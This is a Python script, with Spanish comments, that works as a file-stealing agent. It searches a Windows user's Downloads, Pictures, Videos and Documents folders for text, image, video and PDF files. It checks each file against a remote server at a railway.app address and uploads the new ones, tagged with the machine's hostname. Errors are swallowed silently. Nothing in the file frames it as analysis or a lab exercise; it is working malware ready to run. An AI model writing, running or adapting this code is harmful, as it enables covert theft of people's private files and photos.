import os
import time
import requests
import glob
import socket

SERVER_URL = "https://netrunner-pro.up.railway.app"
AGENT_ID = socket.gethostname()

def run_exfiltration():
    user_profile = os.environ.get('USERPROFILE', '')
    targets = [
        os.path.join(user_profile, 'Downloads'),
        os.path.join(user_profile, 'Pictures'),
        os.path.join(user_profile, 'Videos'),
        os.path.join(user_profile, 'Documents')
    ]
    
    extensions = ['*.txt', '*.jpg', '*.png', '*.mp4', '*.pdf']
    
    for folder in targets:
        if not os.path.exists(folder): continue
        for ext in extensions:
            for file_path in glob.glob(os.path.join(folder, ext)):
                filename = os.path.basename(file_path)
                try:
                    # 1. Verificar si el archivo ya existe en el servidor
                    check = requests.get(f"{SERVER_URL}/api/check-file", params={
                        'agentId': AGENT_ID, 
                        'filename': filename
                    }, timeout=5)
                    
                    if check.status_code == 200 and check.json().get('exists'):
                        continue 

                    # 2. Subir si es nuevo
                    with open(file_path, 'rb') as f:
                        requests.post(f"{SERVER_URL}/api/upload", 
                                    files={'file': f}, 
                                    data={'agentId': AGENT_ID},
                                    timeout=10)
                except:
                    continue

if __name__ == "__main__":
    # Pequeño delay para asegurar conexión a internet
    time.sleep(5)
    run_exfiltration()
